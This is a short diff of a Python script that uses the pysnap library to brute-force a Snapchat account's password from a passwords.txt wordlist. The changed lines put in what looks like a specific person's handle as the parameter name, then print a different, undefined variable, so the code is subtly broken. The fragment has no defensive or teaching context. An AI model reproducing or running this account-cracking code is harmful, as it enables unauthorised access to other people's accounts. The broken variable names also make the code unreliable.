@@ -4,8 +4,8 @@ from pysnap import Snapchat
 import sys
 import os
 
-def crack(username):
-	print("now cracking: " + username)
+def crack(khaled_kwq81):
+	print("now cracking: " + berodashti)
 	snapchat = Snapchat()
 	passwords = open("passwords.txt","r")
 	i = 0
